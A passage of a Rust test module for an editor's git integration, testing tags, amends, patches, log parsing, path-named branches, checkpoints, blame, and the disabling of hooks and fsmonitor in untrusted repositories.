        git_command(repo_dir.path(), ["branch", "v1.0.0"]);
        let branch_tip = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]);
        let listed = repository
            .run_command(
                vec![
                    "for-each-ref".into(),
                    format!("--format={TAG_LIST_FORMAT}"),
                    "refs/tags/".into(),
                ],
                None,
                env.clone(),
                HashMap::default(),
            )
            .await
            .unwrap();
        let tags = TagInfo::parse_list(&listed.stdout);
        let lightweight = tags
            .iter()
            .find(|tag| tag.name == "v1.0.0")
            .unwrap_or_else(|| panic!("v1.0.0 is missing from {:?}", listed.stdout));
        assert_eq!(lightweight.rev(), "refs/tags/v1.0.0");
        let resolve = async |rev: String| {
            repository
                .run_command(
                    vec!["rev-parse".into(), "--verify".into(), rev],
                    None,
                    env.clone(),
                    HashMap::default(),
                )
                .await
                .unwrap()
                .stdout
                .trim()
                .to_string()
        };
        assert_eq!(resolve(lightweight.rev()).await, tagged);
        assert_eq!(resolve("refs/heads/v1.0.0".into()).await, branch_tip);
        assert_ne!(tagged, branch_tip);
    }

    /// Rewording HEAD goes through `commit --amend --only -m`, which must leave whatever the user
    /// had staged staged instead of committing it along with the new message.
    #[gpui::test]
    async fn test_amending_the_head_message_leaves_staged_work_alone(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());

        fs::write(repo_dir.path().join("committed.txt"), "one\n").unwrap();
        git_command(repo_dir.path(), ["add", "committed.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "first"]);

        fs::write(repo_dir.path().join("staged.txt"), "work in progress\n").unwrap();
        git_command(repo_dir.path(), ["add", "staged.txt"]);

        let repository = open_repository(repo_dir.path(), cx);
        let amended = repository
            .run_command(
                vec![
                    "commit".into(),
                    "--amend".into(),
                    "--only".into(),
                    "-m".into(),
                    "first (reworded)".into(),
                ],
                None,
                Arc::new(test_commit_envs()),
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(amended.succeeded(), "{}", amended.failure_message());

        assert_eq!(
            git_command_output(repo_dir.path(), ["log", "--format=%s"]),
            "first (reworded)"
        );
        assert_eq!(
            git_command_output(
                repo_dir.path(),
                ["show", "--name-only", "--format=", "HEAD"]
            ),
            "committed.txt",
            "the staged file must not have been swept into the amended commit"
        );
        assert_eq!(
            git_command_output(repo_dir.path(), ["diff", "--cached", "--name-only"]),
            "staged.txt",
            "and it must still be staged afterwards"
        );
    }

    #[gpui::test]
    async fn test_patch_creation_and_application_round_trip(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let file_path = repo_dir.path().join("file.txt");
        fs::write(&file_path, "base\n").unwrap();
        git_command(repo_dir.path(), ["add", "file.txt"]);
        git_command(repo_dir.path(), ["commit", "-m", "initial"]);
        fs::write(&file_path, "changed\n").unwrap();

        let repository = open_repository(repo_dir.path(), cx);
        let env = Arc::new(test_commit_envs());

        let patch = repository
            .run_command(
                PatchSource::Worktree.args(),
                None,
                env.clone(),
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(patch.succeeded(), "{}", patch.failure_message());
        assert!(!patch.stdout.trim().is_empty());

        git_command(repo_dir.path(), ["checkout", "--", "file.txt"]);
        assert_eq!(fs::read_to_string(&file_path).unwrap(), "base\n");

        let applied = repository
            .run_command(
                vec!["apply".into()],
                Some(patch.stdout.clone()),
                env.clone(),
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(applied.succeeded(), "{}", applied.failure_message());
        assert_eq!(fs::read_to_string(&file_path).unwrap(), "changed\n");

        let head_patch = repository
            .run_command(
                PatchSource::HeadCommit.args(),
                None,
                env.clone(),
                HashMap::default(),
            )
            .await
            .unwrap();
        assert!(head_patch.succeeded(), "{}", head_patch.failure_message());
        assert!(
            head_patch.stdout.starts_with("From "),
            "format-patch should produce a mailbox patch, got: {}",
            &head_patch.stdout[..head_patch.stdout.len().min(80)]
        );

        let rejected = repository
            .run_command(
                vec!["apply".into()],
                Some("this is not a patch\n".to_string()),
                env,
                HashMap::default(),
            )
            .await
            .expect("a rejected patch must not be reported as a failed command");
        assert!(!rejected.succeeded());
        assert!(
            !rejected.stderr.trim().is_empty(),
            "git's complaint must reach the caller"
        );
    }

    #[test]
    fn test_initial_graph_commit_data_tag_names() {
        let commit = InitialGraphCommitData {
            sha: Oid::from_bytes(&[0; 20]).unwrap(),
            parents: SmallVec::new(),
            ref_names: vec![
                SharedString::from("HEAD -> main"),
                SharedString::from("origin/main"),
                SharedString::from("tag: v1.0.0"),
                SharedString::from("tag: v1.1.0"),
                SharedString::from("tag: "),
                SharedString::from("refs/heads/feature"),
            ],
        };

        assert_eq!(commit.tag_names(), ["v1.0.0", "v1.1.0"]);
    }

    #[test]
    fn test_parse_file_history_changed_files_output() {
        let queried_paths = vec![
            RepoPath::new("src/a.rs").unwrap(),
            RepoPath::new("src/b.rs").unwrap(),
        ];
        let output = concat!(
            "\x1e1111111111111111111111111111111111111111\0\nsrc/a.rs\0src/shared.rs\0",
            "\x1e2222222222222222222222222222222222222222\0\nsrc/b.rs\0src/shared.rs\0",
            "\x1e3333333333333333333333333333333333333333\0\nsrc/a.rs\0src/b.rs\0src/shared.rs\0",
        );

        let histories =
            parse_file_history_changed_files_output(output, &queried_paths, &HashSet::default());

        assert_eq!(histories.len(), 2);
        assert_eq!(
            histories[0].file_sets,
            vec![
                vec![
                    RepoPath::new("src/a.rs").unwrap(),
                    RepoPath::new("src/shared.rs").unwrap(),
                ],
                vec![
                    RepoPath::new("src/a.rs").unwrap(),
                    RepoPath::new("src/b.rs").unwrap(),
                    RepoPath::new("src/shared.rs").unwrap(),
                ],
            ]
        );
        assert_eq!(
            histories[1].file_sets,
            vec![
                vec![
                    RepoPath::new("src/b.rs").unwrap(),
                    RepoPath::new("src/shared.rs").unwrap(),
                ],
                vec![
                    RepoPath::new("src/a.rs").unwrap(),
                    RepoPath::new("src/b.rs").unwrap(),
                    RepoPath::new("src/shared.rs").unwrap(),
                ],
            ]
        );
    }

    #[test]
    fn test_parse_file_history_changed_files_output_skips_shallow_boundary() {
        let queried_paths = vec![RepoPath::new("src/a.rs").unwrap()];
        let output = concat!(
            "\x1e1111111111111111111111111111111111111111\0\nsrc/a.rs\0src/shared.rs\0",
            "\x1e2222222222222222222222222222222222222222\0\nsrc/a.rs\0src/b.rs\0src/shared.rs\0",
        );
        let shallow_boundary_oids =
            HashSet::from_iter(["2222222222222222222222222222222222222222".to_string()]);

        let histories =
            parse_file_history_changed_files_output(output, &queried_paths, &shallow_boundary_oids);

        assert_eq!(histories.len(), 1);
        assert_eq!(
            histories[0].file_sets,
            vec![vec![
                RepoPath::new("src/a.rs").unwrap(),
                RepoPath::new("src/shared.rs").unwrap(),
            ]]
        );
    }

    #[test]
    fn test_parse_initial_graph_output_filters_graft_decorations() {
        let line = "0f36a166633a057bf7dd660508d237cad2606cab\x00\x00grafted, HEAD -> refs/heads/main, refs/remotes/origin/main";
        let commits = parse_initial_graph_output([line].into_iter(), false);
        assert_eq!(commits.len(), 1);
        assert_eq!(commits[0].parents.len(), 0);
        assert_eq!(
            commits[0].ref_names,
            vec![
                SharedString::from("HEAD -> refs/heads/main"),
                SharedString::from("refs/remotes/origin/main"),
            ]
        );
    }

    #[gpui::test]
    async fn test_initial_graph_data_accepts_sha_log_source(cx: &mut TestAppContext) {
        disable_git_global_config();

        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();

        git_init_repo(repo_dir.path());
        fs::write(repo_dir.path().join("file"), "initial").unwrap();
        git_command(repo_dir.path(), ["add", "file"]);
        git_command(repo_dir.path(), ["commit", "-m", "Initial commit"]);

        let commit_sha: Oid = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"])
            .parse()
            .unwrap();

        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        let (request_tx, request_rx) = async_channel::unbounded();

        repo.initial_graph_data(LogSource::Sha(commit_sha), LogOrder::DateOrder, request_tx)
            .await
            .unwrap();

        let graph_data = request_rx.recv().await.unwrap();
        assert_eq!(graph_data.len(), 1);
        assert_eq!(graph_data[0].sha, commit_sha);
    }

    /// A branch whose name also names a path in the working tree - `docs/rewrite` in a
    /// repository that also has a `docs/rewrite` directory - made git reject the revision
    /// as ambiguous, so the git panel's History tab reported "Failed to load commit
    /// history" and commit search silently returned nothing.
    #[gpui::test]
    async fn test_initial_graph_data_with_branch_named_after_a_path(cx: &mut TestAppContext) {
        disable_git_global_config();

        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();

        git_init_repo(repo_dir.path());
        fs::create_dir_all(repo_dir.path().join("docs/rewrite")).unwrap();
        fs::write(repo_dir.path().join("docs/rewrite/notes.md"), "notes").unwrap();
        git_command(repo_dir.path(), ["add", "."]);
        git_command(repo_dir.path(), ["commit", "-m", "Add rewrite notes"]);
        git_command(repo_dir.path(), ["checkout", "-b", "docs/rewrite"]);

        let commit_sha: Oid = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"])
            .parse()
            .unwrap();

        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();

        let (request_tx, request_rx) = async_channel::unbounded();

        repo.initial_graph_data(
            LogSource::Branch("docs/rewrite".into()),
            LogOrder::DateOrder,
            request_tx,
        )
        .await
        .unwrap();

        let graph_data = request_rx.recv().await.unwrap();
        assert_eq!(graph_data.len(), 1);
        assert_eq!(graph_data[0].sha, commit_sha);
    }

    /// The branch diff passes the base ref straight to `git diff`, so a branch named after
    /// a path in the working tree broke it the same way. `git diff` takes the same `--`
    /// terminator, so the base ref is terminated like the log sources are.
    #[gpui::test]
    async fn test_merge_base_worktree_diff_with_branch_named_after_a_path(cx: &mut TestAppContext) {
        disable_git_global_config();

        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();

        git_init_repo(repo_dir.path());
        fs::create_dir_all(repo_dir.path().join("docs/rewrite")).unwrap();
        let notes_path = repo_dir.path().join("docs/rewrite/notes.md");
        fs::write(&notes_path, "notes\n").unwrap();
        git_command(repo_dir.path(), ["add", "."]);
        git_command(repo_dir.path(), ["commit", "-m", "Add rewrite notes"]);
        git_command(repo_dir.path(), ["checkout", "-b", "docs/rewrite"]);

        let base_oid: Oid =
            git_command_output(repo_dir.path(), ["rev-parse", "HEAD:docs/rewrite/notes.md"])
                .parse()
                .unwrap();

        fs::write(&notes_path, "edited\n").unwrap();

        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();

        let diff = repo
            .diff_tree(DiffTreeType::MergeBaseWithWorktree {
                base: "docs/rewrite".into(),
            })
            .await
            .unwrap();

        assert_eq!(
            diff,
            TreeDiff {
                entries: HashMap::from_iter([(
                    RepoPath::new("docs/rewrite/notes.md").unwrap(),
                    TreeDiffStatus::Modified { old: base_oid },
                )]),
            }
        );
    }

    /// `show` takes the revision the user typed in the "open commit by ref" input, so a
    /// branch named after a path in the working tree reaches git unqualified there too.
    #[gpui::test]
    async fn test_show_with_branch_named_after_a_path(cx: &mut TestAppContext) {
        disable_git_global_config();

        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();

        git_init_repo(repo_dir.path());
        fs::create_dir_all(repo_dir.path().join("docs/rewrite")).unwrap();
        fs::write(repo_dir.path().join("docs/rewrite/notes.md"), "notes").unwrap();
        git_command(repo_dir.path(), ["add", "."]);
        git_command(repo_dir.path(), ["commit", "-m", "Add rewrite notes"]);
        git_command(repo_dir.path(), ["checkout", "-b", "docs/rewrite"]);

        let commit_sha: Oid = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"])
            .parse()
            .unwrap();

        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();

        let details = repo.show("docs/rewrite".to_string()).await.unwrap();
        assert_eq!(details.sha.as_ref(), commit_sha.to_string());
    }

    #[test]
    fn test_log_source_terminates_revisions() {
        // Every revision-taking source has to end the revision list, or git cannot tell a
        // branch name from an identically named path. `Path` is the exception: it states
        // the separator itself, before the path it is passing.
        for source in [
            LogSource::All,
            LogSource::Branch("docs/rewrite".into()),
            LogSource::Sha(Oid::from_str("0000000000000000000000000000000000000000").unwrap()),
        ] {
            let args = source.get_args();
            assert_eq!(
                args.last().map(|arg| arg.as_ref()),
                Some("--"),
                "{source:?} must terminate its revisions"
            );
        }

        let path_source = LogSource::Path(RepoPath::new("docs/rewrite").unwrap());
        let path_args = path_source.get_args();
        assert_eq!(
            path_args.iter().filter(|arg| arg.as_ref() == "--").count(),
            1,
            "Path states the separator itself and must not gain a second one"
        );
    }

    #[gpui::test]
    async fn test_build_command_untrusted_includes_both_safety_args(cx: &mut TestAppContext) {
        cx.executor().allow_parking();
        let dir = tempfile::tempdir().unwrap();
        let git = GitBinary::new(
            PathBuf::from("git"),
            dir.path().to_path_buf(),
            dir.path().join(".git"),
            cx.executor(),
            false,
        );
        let output = git
            .build_command(&["version"])
            .await
            .output()
            .await
            .expect("git version should succeed");
        assert!(output.status.success());

        let git = GitBinary::new(
            PathBuf::from("git"),
            dir.path().to_path_buf(),
            dir.path().join(".git"),
            cx.executor(),
            false,
        );
        let output = git
            .build_command(&["config", "--get", "core.fsmonitor"])
            .await
            .output()
            .await
            .expect("git config should run");
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert_eq!(
            stdout.trim(),
            "false",
            "fsmonitor should be disabled for untrusted repos"
        );

        git_init_repo(dir.path());
        let git = GitBinary::new(
            PathBuf::from("git"),
            dir.path().to_path_buf(),
            dir.path().join(".git"),
            cx.executor(),
            false,
        );
        let output = git
            .build_command(&["config", "--get", "core.hooksPath"])
            .await
            .output()
            .await
            .expect("git config should run");
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert_eq!(
            stdout.trim(),
            "/dev/null",
            "hooksPath should be /dev/null for untrusted repos"
        );
    }

    #[gpui::test]
    async fn test_build_command_trusted_only_disables_fsmonitor(cx: &mut TestAppContext) {
        cx.executor().allow_parking();
        let dir = tempfile::tempdir().unwrap();
        git_init_repo(dir.path());

        let git = GitBinary::new(
            PathBuf::from("git"),
            dir.path().to_path_buf(),
            dir.path().join(".git"),
            cx.executor(),
            true,
        );
        let output = git
            .build_command(&["config", "--get", "core.fsmonitor"])
            .await
            .output()
            .await
            .expect("git config should run");
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert_eq!(
            stdout.trim(),
            "false",
            "fsmonitor should be disabled even for trusted repos"
        );

        let git = GitBinary::new(
            PathBuf::from("git"),
            dir.path().to_path_buf(),
            dir.path().join(".git"),
            cx.executor(),
            true,
        );
        let output = git
            .build_command(&["config", "--get", "core.hooksPath"])
            .await
            .output()
            .await
            .expect("git config should run");
        assert!(
            !output.status.success(),
            "hooksPath should NOT be overridden for trusted repos"
        );
    }

    #[gpui::test]
    async fn test_build_command_disables_log_show_signature(cx: &mut TestAppContext) {
        cx.executor().allow_parking();
        let dir = tempfile::tempdir().unwrap();
        git_init_repo(dir.path());

        let git = GitBinary::new(
            PathBuf::from("git"),
            dir.path().to_path_buf(),
            dir.path().join(".git"),
            cx.executor(),
            true,
        );
        let output = git
            .build_command(&["config", "--get", "log.showSignature"])
            .await
            .output()
            .await
            .expect("git config should run");
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert_eq!(
            stdout.trim(),
            "false",
            "log.showSignature should be disabled for trusted repos"
        );

        let git = GitBinary::new(
            PathBuf::from("git"),
            dir.path().to_path_buf(),
            dir.path().join(".git"),
            cx.executor(),
            false,
        );
        let output = git
            .build_command(&["config", "--get", "log.showSignature"])
            .await
            .output()
            .await
            .expect("git config should run");
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert_eq!(
            stdout.trim(),
            "false",
            "log.showSignature should be disabled for untrusted repos"
        );
    }

    #[gpui::test]
    async fn test_path_for_index_id_uses_real_git_directory(cx: &mut TestAppContext) {
        cx.executor().allow_parking();
        let working_directory = PathBuf::from("/code/worktree");
        let git_directory = PathBuf::from("/code/repo/.git/modules/worktree");
        let git = GitBinary::new(
            PathBuf::from("git"),
            working_directory,
            git_directory.clone(),
            cx.executor(),
            false,
        );

        let path = git.path_for_index_id(Uuid::nil());

        assert_eq!(
            path,
            git_directory.join(format!("index-{}.tmp", Uuid::nil()))
        );
    }

    #[gpui::test]
    async fn test_checkpoint_basic(cx: &mut TestAppContext) {
        disable_git_global_config();

        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();

        git_init_repo(repo_dir.path());
        let file_path = repo_dir.path().join("file");
        smol::fs::write(&file_path, "initial").await.unwrap();

        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        repo.stage_paths(vec![repo_path("file")], Arc::new(HashMap::default()))
            .await
            .unwrap();
        repo.commit(
            "Initial commit".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .unwrap();

        smol::fs::write(&file_path, "modified before checkpoint")
            .await
            .unwrap();
        smol::fs::write(repo_dir.path().join("new_file_before_checkpoint"), "1")
            .await
            .unwrap();
        let checkpoint = repo.checkpoint().await.unwrap();

        // Ensure the user can't see any branches after creating a checkpoint.
        assert_eq!(repo.branches().await.unwrap().branches.len(), 1);

        smol::fs::write(&file_path, "modified after checkpoint")
            .await
            .unwrap();
        repo.stage_paths(vec![repo_path("file")], Arc::new(HashMap::default()))
            .await
            .unwrap();
        repo.commit(
            "Commit after checkpoint".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .unwrap();

        smol::fs::remove_file(repo_dir.path().join("new_file_before_checkpoint"))
            .await
            .unwrap();
        smol::fs::write(repo_dir.path().join("new_file_after_checkpoint"), "2")
            .await
            .unwrap();

        // Ensure checkpoint stays alive even after a Git GC.
        repo.gc().await.unwrap();
        repo.restore_checkpoint(checkpoint.clone()).await.unwrap();

        assert_eq!(
            smol::fs::read_to_string(&file_path).await.unwrap(),
            "modified before checkpoint"
        );
        assert_eq!(
            smol::fs::read_to_string(repo_dir.path().join("new_file_before_checkpoint"))
                .await
                .unwrap(),
            "1"
        );
        // See TODO above
        // assert_eq!(
        //     smol::fs::read_to_string(repo_dir.path().join("new_file_after_checkpoint"))
        //         .await
        //         .ok(),
        //     None
        // );
    }

    #[cfg(unix)]
    #[gpui::test]
    async fn test_commit_runs_git_hooks(cx: &mut TestAppContext) {
        use std::os::unix::fs::PermissionsExt as _;

        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();

        let hooks_dir = repo_dir.path().join(".git").join("hooks");
        fs::create_dir_all(&hooks_dir).unwrap();
        let write_hook = |name: &str, contents: &str| {
            let path = hooks_dir.join(name);
            fs::write(&path, contents).unwrap();
            fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        };

        write_hook("pre-commit", "#!/bin/sh\nexit 1\n");

        fs::write(repo_dir.path().join("file"), "one").unwrap();
        repo.stage_paths(vec![repo_path("file")], Arc::new(HashMap::default()))
            .await
            .unwrap();

        // Hooks must not run for untrusted repositories.
        let untrusted_commit = repo
            .commit(
                "Commit in untrusted repo".into(),
                None,
                CommitOptions::default(),
                AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
                Arc::new(test_commit_envs()),
            )
            .await;
        if installed_git_supports(GitFeature::HooksPath) {
            untrusted_commit.expect("failing pre-commit hook should be skipped in untrusted repos");
        } else {
            let error = untrusted_commit
                .expect_err("a git that can't skip hooks must not commit in untrusted repos");
            assert!(
                error.to_string().contains("Trust the project to run it."),
                "unexpected error: {error:#}"
            );
        }

        repo.set_trusted(true);

        fs::write(repo_dir.path().join("file"), "two").unwrap();
        repo.stage_paths(vec![repo_path("file")], Arc::new(HashMap::default()))
            .await
            .unwrap();

        repo.commit(
            "Commit blocked by hook".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .expect_err("failing pre-commit hook should abort the commit");

        write_hook("pre-commit", "#!/bin/sh\nexit 0\n");
        write_hook(
            "commit-msg",
            "#!/bin/sh\necho 'rewritten by commit-msg hook' > \"$1\"\n",
        );

        repo.commit(
            "Original message".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .unwrap();

        let message = git_command_output(repo_dir.path(), ["log", "-1", "--pretty=%B"]);
        assert_eq!(message, "rewritten by commit-msg hook");

        write_hook("pre-commit", "#!/bin/sh\nexit 1\n");
        fs::write(repo_dir.path().join("file"), "three").unwrap();
        repo.stage_paths(vec![repo_path("file")], Arc::new(HashMap::default()))
            .await
            .unwrap();

        repo.commit(
            "Commit without verification".into(),
            None,
            CommitOptions {
                no_verify: true,
                ..Default::default()
            },
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .expect("--no-verify should skip pre-commit and commit-msg hooks");

        let message = git_command_output(repo_dir.path(), ["log", "-1", "--pretty=%B"]);
        assert_eq!(message, "Commit without verification");
    }

    #[gpui::test]
    async fn test_load_revisions(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());

        let file1_path = repo_dir.path().join("file1");
        let file2_path = repo_dir.path().join("file2");
        let space_file_path = repo_dir.path().join("file with spaces");

        smol::fs::write(&file1_path, "file1 committed contents")
            .await
            .unwrap();
        smol::fs::write(&file2_path, "file2 committed contents")
            .await
            .unwrap();
        smol::fs::write(&space_file_path, "space file committed contents")
            .await
            .unwrap();

        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        // Stage files and commit
        repo.stage_paths(
            vec![
                repo_path("file1"),
                repo_path("file2"),
                repo_path("file with spaces"),
            ],
            Arc::new(HashMap::default()),
        )
        .await
        .unwrap();
        repo.commit(
            "Initial commit".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .unwrap();

        // Now modify files in index but not yet committed
        smol::fs::write(&file1_path, "file1 index contents")
            .await
            .unwrap();
        repo.stage_paths(vec![repo_path("file1")], Arc::new(HashMap::default()))
            .await
            .unwrap();

        // Write working tree contents (not indexed, not committed)
        smol::fs::write(&file1_path, "file1 worktree contents")
            .await
            .unwrap();

        // Now test load_revisions
        let results = repo
            .load_revisions(
                [
                    "HEAD:file1",
                    ":file1",
                    "HEAD:file2",
                    ":file2",
                    "HEAD:nonexistent",
                    "HEAD:file with spaces",
                    "HEAD:nonexistent file with spaces",
                ]
                .into_iter()
                .map(String::from)
                .collect(),
            )
            .await
            .unwrap();

        assert_eq!(
            results,
            vec![
                Some(b"file1 committed contents".to_vec()),
                Some(b"file1 index contents".to_vec()),
                Some(b"file2 committed contents".to_vec()),
                Some(b"file2 committed contents".to_vec()), // untouched in index, should match HEAD
                None,
                Some(b"space file committed contents".to_vec()),
                None,
            ]
        );
    }

    #[gpui::test]
    async fn test_blame_at_revision(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        let file_name = "ürlich file1";
        fs::write(repo_dir.path().join(file_name), "line one\n").unwrap();
        git_command(repo_dir.path(), ["add", "-A"]);
        git_command(repo_dir.path(), ["commit", "-m", "First commit"]);
        let first_sha = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]);

        fs::write(repo_dir.path().join(file_name), "line one\nline two\n").unwrap();
        git_command(repo_dir.path(), ["add", "-A"]);
        git_command(repo_dir.path(), ["commit", "-m", "Second commit"]);
        let second_sha = git_command_output(repo_dir.path(), ["rev-parse", "HEAD"]);

        let blame_at_head = repo
            .blame_at_revision(repo_path(file_name), second_sha.parse().unwrap())
            .await
            .unwrap();
        assert_eq!(
            blame_at_head
                .entries
                .iter()
                .map(|entry| {
                    (
                        entry.sha.to_string(),
                        entry.range.clone(),
                        entry.filename.clone(),
                        entry.previous.clone(),
                    )
                })
                .collect::<Vec<_>>(),
            vec![
                (first_sha.clone(), 0..1, file_name.to_owned(), None),
                (
                    second_sha.clone(),
                    1..2,
                    file_name.to_owned(),
                    Some(format!("{first_sha} {file_name}"))
                ),
            ]
        );

        let blame_at_first = repo
            .blame_at_revision(repo_path(file_name), first_sha.parse().unwrap())
            .await
            .unwrap();
        assert_eq!(
            blame_at_first
                .entries
                .iter()
                .map(|entry| (entry.sha.to_string(), entry.range.clone()))
                .collect::<Vec<_>>(),
            vec![(first_sha.clone(), 0..1)]
        );
    }

    #[gpui::test]
    async fn test_checkpoint_empty_repo(cx: &mut TestAppContext) {
        disable_git_global_config();

        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        smol::fs::write(repo_dir.path().join("foo"), "foo")
            .await
            .unwrap();
        let checkpoint_sha = repo.checkpoint().await.unwrap();

        // Ensure the user can't see any branches after creating a checkpoint.
        assert_eq!(repo.branches().await.unwrap().branches.len(), 1);

        smol::fs::write(repo_dir.path().join("foo"), "bar")
            .await
            .unwrap();
        smol::fs::write(repo_dir.path().join("baz"), "qux")
            .await
            .unwrap();
        repo.restore_checkpoint(checkpoint_sha).await.unwrap();
        assert_eq!(
            smol::fs::read_to_string(repo_dir.path().join("foo"))
                .await
                .unwrap(),
            "foo"
        );
        // See TODOs above
        // assert_eq!(
        //     smol::fs::read_to_string(repo_dir.path().join("baz"))
        //         .await
        //         .ok(),
        //     None
        // );
    }

    #[gpui::test]
    async fn test_branches_return_head_when_commit_metadata_cannot_be_read(
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();

        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        smol::fs::write(repo_dir.path().join("file.txt"), "content")
            .await
            .unwrap();
        repo.stage_paths(vec![repo_path("file.txt")], Arc::new(HashMap::default()))
            .await
            .unwrap();
        repo.commit(
            "Initial commit".into(),
            None,
            CommitOptions::default(),
            AskPassDelegate::new(&mut cx.to_async(), |_, _, _| {}),
            Arc::new(test_commit_envs()),
        )
        .await
        .unwrap();

        smol::fs::write(
            repo_dir.path().join(".git").join("refs/heads/broken"),
            "0a103ede22f159c792dc6405e0c8304d9bd4dc29\n",
        )
        .await
        .unwrap();

        let branches_scan = repo.branches().await.unwrap();
        assert!(branches_scan.error.is_some());
        let head_branch = branches_scan
            .branches
            .iter()
            .find(|branch| branch.is_head)
            .expect("branch list should include HEAD");
        assert!(head_branch.ref_name.starts_with("refs/heads/"));

        assert!(
            branches_scan
                .branches
                .iter()
                .all(|branch| branch.ref_name.as_ref() != "refs/heads/broken")
        );
    }

    #[gpui::test]
    async fn test_compare_checkpoints(cx: &mut TestAppContext) {
        disable_git_global_config();

        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        git_init_repo(repo_dir.path());
        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
        trust_if_hooks_cannot_be_disabled(&repo);

        smol::fs::write(repo_dir.path().join("file1"), "content1")
            .await
            .unwrap();
        let checkpoint1 = repo.checkpoint().await.unwrap();

        smol::fs::write(repo_dir.path().join("file2"), "content2")
            .await
            .unwrap();
        let checkpoint2 = repo.checkpoint().await.unwrap();

        assert!(
            !repo
                .compare_checkpoints(checkpoint1, checkpoint2.clone())
                .await
                .unwrap()
        );

        let checkpoint3 = repo.checkpoint().await.unwrap();
        assert!(
            repo.compare_checkpoints(checkpoint2, checkpoint3)
                .await
                .unwrap()
        );
    }

    #[gpui::test]
    async fn test_checkpoint_exclude_binary_files(cx: &mut TestAppContext) {
        disable_git_global_config();

        cx.executor().allow_parking();

        let repo_dir = tempfile::tempdir().unwrap();
        let text_path = repo_dir.path().join("main.rs");
        let bin_path = repo_dir.path().join("binary.o");

        git_init_repo(repo_dir.path());

        smol::fs::write(&text_path, "fn main() {}").await.unwrap();

        smol::fs::write(&bin_path, "some binary file here")
            .await
            .unwrap();

        let repo = RealGitRepository::new(
            &repo_dir.path().join(".git"),
            None,
            Some("git".into()),
            cx.executor(),
        )
        .unwrap();
